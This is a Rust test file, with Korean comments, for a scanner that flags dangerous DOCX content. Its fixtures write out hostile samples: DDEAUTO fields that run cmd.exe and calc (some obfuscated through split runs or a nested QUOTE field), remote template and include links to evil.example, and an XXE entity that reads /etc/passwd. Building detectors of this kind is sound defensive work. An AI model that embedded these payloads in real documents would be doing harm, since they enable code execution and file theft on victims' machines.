//! DOCX 보안 테스트: 원격 참조, 매크로, OLE·ActiveX, DDE 필드, XML 공격.

mod common;

use std::path::Path;

use bookdoctor::cli::{Options, run};
use bookdoctor::scan::scan_file;
use scan_common::{Category, FileReport, Finding, Severity};

const REL_NS: &str = "http://schemas.openxmlformats.org/package/2006/relationships";
const TYPE_BASE: &str = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";

/// `(관계 종류 접미사, 대상, 외부 여부)` 목록으로 .rels XML을 만든다.
fn rels(items: &[(&str, &str, bool)]) -> Vec<u8> {
    let body: String = items
        .iter()
        .enumerate()
        .map(|(i, (ty, target, ext))| format!(r#"<Relationship Id="rId{i}" Type="{TYPE_BASE}/{ty}" Target="{target}"{}/>"#, if *ext { r#" TargetMode="External""# } else { "" }))
        .collect();
    format!(r#"<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="{REL_NS}">{body}</Relationships>"#).into_bytes()
}

fn document(body: &str) -> Vec<u8> {
    format!(r#"<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>{body}</w:body></w:document>"#).into_bytes()
}

/// 한 필드의 지시문을 여러 run에 나눠 담은 문단.
fn field(segments: &[&str]) -> String {
    let runs: String = segments.iter().map(|s| format!("<w:r><w:instrText>{s}</w:instrText></w:r>")).collect();
    format!(r#"<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>{runs}<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>"#)
}

fn scan_named(file: &str, add: &[(&str, &[u8])]) -> (tempfile::TempDir, FileReport) {
    let d = tempfile::tempdir().unwrap();
    let p = d.path().join(file);
    common::docx_with(&p, &[], add);
    let r = scan_file(&p, &Options::default());
    (d, r)
}

fn docx(add: &[(&str, &[u8])]) -> FileReport {
    scan_named("a.docx", add).1
}

fn finding<'a>(r: &'a FileReport, code: &str) -> &'a Finding {
    r.findings.iter().find(|f| f.code == code).unwrap_or_else(|| panic!("{code} missing: {:?} / {:?}", r.findings, r.reasons))
}

fn assert_security(r: &FileReport, code: &str, severity: Severity) {
    let f = finding(r, code);
    assert_eq!((f.category, f.severity), (Category::Security, severity), "{code}: {:?}", r.findings);
}

fn has_ooxml(r: &FileReport) -> bool {
    r.findings.iter().any(|f| f.code.starts_with("OOXML_") && f.category == Category::Security)
}

// --- 관계 ---

#[test]
fn attached_template_external_is_critical_and_internal_is_clean() {
    let r = docx(&[("word/_rels/settings.xml.rels", &rels(&[("attachedTemplate", "http://evil.example/t.dotm", true)]))]);
    assert_security(&r, "OOXML_REMOTE_TEMPLATE", Severity::Critical);
    let clean = docx(&[("word/_rels/settings.xml.rels", &rels(&[("attachedTemplate", "template.dotm", false)]))]);
    assert!(!has_ooxml(&clean), "{:?}", clean.findings);
}

#[test]
fn ordinary_external_hyperlink_is_clean() {
    let r = docx(&[("word/_rels/document.xml.rels", &rels(&[("hyperlink", "https://example.com/page", true), ("hyperlink", "mailto:a@example.com", true)]))]);
    assert!(!has_ooxml(&r), "일반 하이퍼링크는 소음이 되면 안 된다: {:?}", r.findings);
}

#[test]
fn external_ole_object_subdocument_frame_and_link_path_are_high() {
    for ty in ["oleObject", "subDocument", "frame", "externalLinkPath"] {
        let r = docx(&[("word/_rels/document.xml.rels", &rels(&[(ty, "http://evil.example/x", true)]))]);
        assert_security(&r, "OOXML_EXTERNAL_OBJECT", Severity::High);
    }
}

#[test]
fn unc_and_file_targets_are_high_for_any_relationship_type() {
    for target in ["\\\\\\\\evil\\\\share\\\\x.png", "file:///c:/secret.txt", "FILE://host/x"] {
        let r = docx(&[("word/_rels/document.xml.rels", &rels(&[("hyperlink", target, true)]))]);
        assert_security(&r, "OOXML_UNC_TARGET", Severity::High);
    }
}

#[test]
fn external_image_is_medium_and_hidden_by_default() {
    let r = docx(&[("word/_rels/document.xml.rels", &rels(&[("image", "http://tracker.example/p.gif", true)]))]);
    assert_security(&r, "OOXML_EXTERNAL_IMAGE", Severity::Medium);
    let d = tempfile::tempdir().unwrap();
    common::docx_with(&d.path().join("img.docx"), &[], &[("word/_rels/document.xml.rels", &rels(&[("image", "http://tracker.example/p.gif", true)]))]);
    let show = |extra: &[&str]| {
        let mut argv: Vec<String> = extra.iter().map(|s| s.to_string()).collect();
        argv.extend(["--color".into(), "never".into(), "-r".into(), d.path().to_string_lossy().into_owned()]);
        let mut out = Vec::new();
        run(&argv, &mut out);
        String::from_utf8(out).unwrap()
    };
    assert!(!show(&[]).contains("OOXML_EXTERNAL_IMAGE"));
    assert!(show(&["--min-severity", "low"]).contains("OOXML_EXTERNAL_IMAGE"));
}

// --- 부분 ---

#[test]
fn vba_project_is_critical_in_docx_and_high_in_docm() {
    let add: &[(&str, &[u8])] = &[("word/vbaProject.bin", b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1 macro")];
    assert_security(&scan_named("a.docx", add).1, "OOXML_VBA_PROJECT", Severity::Critical);
    assert_security(&scan_named("a.dotx", add).1, "OOXML_VBA_PROJECT", Severity::Critical);
    assert_security(&scan_named("a.docm", add).1, "OOXML_VBA_PROJECT", Severity::High);
    assert_security(&scan_named("a.dotm", add).1, "OOXML_VBA_PROJECT", Severity::High);
    assert!(!has_ooxml(&scan_named("a.docm", &[]).1));
}

#[test]
fn embedded_ole_activex_and_packages_are_flagged_by_part() {
    let ole = docx(&[("word/embeddings/oleObject1.bin", b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1 data")]);
    assert_security(&ole, "OOXML_OLE_OBJECT", Severity::High);
    let ax = docx(&[("word/activeX/activeX1.xml", b"<ax:ocx xmlns:ax='urn:x'/>"), ("word/activeX/activeX1.bin", b"binary")]);
    assert_security(&ax, "OOXML_ACTIVEX", Severity::High);
    let pkg = docx(&[("word/embeddings/Microsoft_Word_Document1.docx", b"PK\x03\x04 inner")]);
    assert_security(&pkg, "OOXML_EMBEDDED_PACKAGE", Severity::Medium);
}

// --- 필드 ---

#[test]
fn dde_fields_are_critical_including_split_runs_and_fldsimple_and_lowercase() {
    let plain = docx(&[("word/document.xml", &document(&field(&[" DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc\""])))]);
    assert_security(&plain, "OOXML_DDE_FIELD", Severity::Critical);
    let split = docx(&[("word/document.xml", &document(&field(&[" DDE", "AUTO c:\\\\windows\\\\system32\\\\cmd.exe"])))]);
    assert_security(&split, "OOXML_DDE_FIELD", Severity::Critical);
    let simple = docx(&[("word/document.xml", &document(r#"<w:fldSimple w:instr=" DDEAUTO calc.exe "><w:r><w:t>x</w:t></w:r></w:fldSimple>"#))]);
    assert_security(&simple, "OOXML_DDE_FIELD", Severity::Critical);
    let lower = docx(&[("word/document.xml", &document(&field(&["  dde cmd.exe "])))]);
    assert_security(&lower, "OOXML_DDE_FIELD", Severity::Critical);
}

#[test]
fn include_fields_are_high_only_when_they_point_at_a_url_or_unc() {
    for instr in [" INCLUDETEXT \"http://evil.example/x.docx\" ", " INCLUDEPICTURE \"https://evil.example/p.png\" ", " LINK Excel.Sheet.12 \"\\\\\\\\evil\\\\share\\\\x.xlsx\" ", " INCLUDETEXT \"file:///c:/x.docx\" "] {
        let r = docx(&[("word/document.xml", &document(&field(&[instr])))]);
        assert_security(&r, "OOXML_DANGEROUS_FIELD", Severity::High);
    }
    for instr in [" INCLUDETEXT \"chapter2.docx\" ", " PAGE ", " HYPERLINK \"https://example.com\" ", " TOC \\\\o \"1-3\" "] {
        let r = docx(&[("word/document.xml", &document(&field(&[instr])))]);
        assert!(!has_ooxml(&r), "{instr}: {:?}", r.findings);
    }
}

// --- XML 공격과 한도 ---

#[test]
fn xml_entity_and_dtd_attacks_use_the_epub_codes() {
    let xxe = br#"<?xml version="1.0"?><!DOCTYPE d [<!ENTITY x SYSTEM "file:///etc/passwd">]><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>&x;</w:body></w:document>"#;
    assert_security(&docx(&[("word/document.xml", xxe)]), "XXE_ENTITY", Severity::Critical);
    let dtd = br#"<?xml version="1.0"?><!DOCTYPE d SYSTEM "http://evil.example/x.dtd"><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body/></w:document>"#;
    assert!(docx(&[("word/document.xml", dtd)]).has("EXTERNAL_DTD"));
    let local = br#"<?xml version="1.0"?><!DOCTYPE d [<!ENTITY y "text">]><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body/></w:document>"#;
    assert_security(&docx(&[("word/document.xml", local)]), "ENTITY_DECLARATION", Severity::Medium);
}

#[test]
fn part_larger_than_the_budget_is_incomplete_not_read_in_full() {
    let d = tempfile::tempdir().unwrap();
    let p = d.path().join("big.docx");
    let mut big = document("<w:p/>");
    big.extend(vec![b' '; 3 * 1024 * 1024]);
    common::docx_with(&p, &[], &[("word/document.xml", &big)]);
    let r = scan_file(&p, &Options { max_total_mb: 1, ..Options::default() });
    assert!(r.incomplete, "{:?} {:?}", r.findings, r.reasons);
}

#[test]
fn clean_docx_with_normal_relationships_has_no_security_findings() {
    let r = docx(&[
        ("word/_rels/document.xml.rels", &rels(&[("hyperlink", "https://example.com", true), ("styles", "styles.xml", false), ("image", "media/image1.png", false)])),
        ("word/document.xml", &document(&field(&[" PAGE "]))),
    ]);
    assert!(r.findings.is_empty() && !r.incomplete, "{:?} {:?}", r.findings, r.reasons);
}

#[allow(dead_code)]
fn _unused(_: &Path) {}

// --- 보안 검토 반영: 인코딩, 대소문자·경로, 중첩 필드 ---

fn utf16(text: &str, little: bool) -> Vec<u8> {
    let mut out = if little { vec![0xFF, 0xFE] } else { vec![0xFE, 0xFF] };
    for unit in text.encode_utf16() {
        out.extend(if little { unit.to_le_bytes() } else { unit.to_be_bytes() });
    }
    out
}

fn rels_text(items: &[(&str, &str, bool)]) -> String {
    String::from_utf8(rels(items)).unwrap()
}

fn doc_text(body: &str) -> String {
    String::from_utf8(document(body)).unwrap()
}

#[test]
fn utf16_encoded_parts_are_still_inspected() {
    for little in [true, false] {
        let r = docx(&[("word/_rels/settings.xml.rels", &utf16(&rels_text(&[("attachedTemplate", "http://evil.example/t.dotm", true)]), little))]);
        assert_security(&r, "OOXML_REMOTE_TEMPLATE", Severity::Critical);
        let r = docx(&[("word/document.xml", &utf16(&doc_text(&field(&[" DDEAUTO cmd.exe "])), little))]);
        assert_security(&r, "OOXML_DDE_FIELD", Severity::Critical);
    }
}

#[test]
fn valid_utf16_document_is_not_reported_as_malformed() {
    let r = docx(&[("word/document.xml", &utf16(&doc_text("<w:p><w:r><w:t>본문</w:t></w:r></w:p>"), true))]);
    assert!(!r.has("MALFORMED_MARKUP") && r.findings.is_empty(), "{:?}", r.findings);
}

#[test]
fn utf32_part_cannot_be_inspected_and_is_incomplete() {
    let mut part = vec![0xFF, 0xFE, 0x00, 0x00];
    part.extend(b"<\0\0\0w\0\0\0".iter());
    let r = docx(&[("word/_rels/settings.xml.rels", &part)]);
    assert!(r.incomplete && r.reasons.iter().any(|x| x.contains("UTF-32")), "{:?}", r.reasons);
}

#[test]
fn unparsable_relationship_part_makes_the_scan_incomplete_not_silent() {
    let r = docx(&[("word/_rels/settings.xml.rels", b"<Relationships><Relationship Target=")]);
    assert!(r.incomplete && r.reasons.iter().any(|x| x.contains("settings.xml.rels") && x.contains("parsed")), "{:?}", r.reasons);
}

#[test]
fn xml_and_rels_parts_are_inspected_whatever_their_case_or_directory() {
    let r = docx(&[("Word/_Rels/Settings.Xml.Rels", &rels(&[("attachedTemplate", "http://evil.example/t.dotm", true)]))]);
    assert_security(&r, "OOXML_REMOTE_TEMPLATE", Severity::Critical);
    let r = docx(&[("WORD/FOOTER1.XML", &document(&field(&[" DDEAUTO cmd.exe "])))]);
    assert_security(&r, "OOXML_DDE_FIELD", Severity::Critical);
    let r = docx(&[("customXml/item1.xml", &document(&field(&[" DDE cmd.exe "])))]);
    assert_security(&r, "OOXML_DDE_FIELD", Severity::Critical);
    let r = docx(&[("Word/VBAProject.BIN", b"\xD0\xCF\x11\xE0 macro")]);
    assert_security(&r, "OOXML_VBA_PROJECT", Severity::Critical);
}

const BEGIN: &str = r#"<w:r><w:fldChar w:fldCharType="begin"/></w:r>"#;
const END: &str = r#"<w:r><w:fldChar w:fldCharType="end"/></w:r>"#;

fn instr(text: &str) -> String {
    format!("<w:r><w:instrText>{text}</w:instrText></w:r>")
}

#[test]
fn field_whose_keyword_is_computed_by_a_nested_field_is_flagged() {
    // 바깥 필드의 지시문 맨 앞이 안쪽 필드(QUOTE)의 결과다. 키워드를 숨겨 DDE를 조립하는 방식이다.
    let body = format!("<w:p>{BEGIN}{BEGIN}{}{END}{}{END}</w:p>", instr(" QUOTE 68 68 69 65 85 84 79 "), instr(" c:\\\\windows\\\\system32\\\\cmd.exe "));
    let r = docx(&[("word/document.xml", &document(&body))]);
    assert_security(&r, "OOXML_COMPUTED_FIELD", Severity::High);
}

#[test]
fn ordinary_nested_fields_are_not_flagged() {
    let nested_if = format!("<w:p>{BEGIN}{}{BEGIN}{}{END}{}{END}</w:p>", instr(" IF "), instr(" PAGE "), instr(" > 1 \"a\" \"b\" "));
    let plain = field(&[" PAGE "]);
    let r = docx(&[("word/document.xml", &document(&format!("{nested_if}{plain}")))]);
    assert!(!has_ooxml(&r), "{:?}", r.findings);
}

#[test]
fn nested_text_is_included_when_classifying_the_outer_field() {
    let body = format!("<w:p>{BEGIN}{}{BEGIN}{}{END}{END}</w:p>", instr(" INCLUDETEXT "), instr(" QUOTE \"http://evil.example/x.docx\" "));
    let r = docx(&[("word/document.xml", &document(&body))]);
    assert_security(&r, "OOXML_DANGEROUS_FIELD", Severity::High);
}
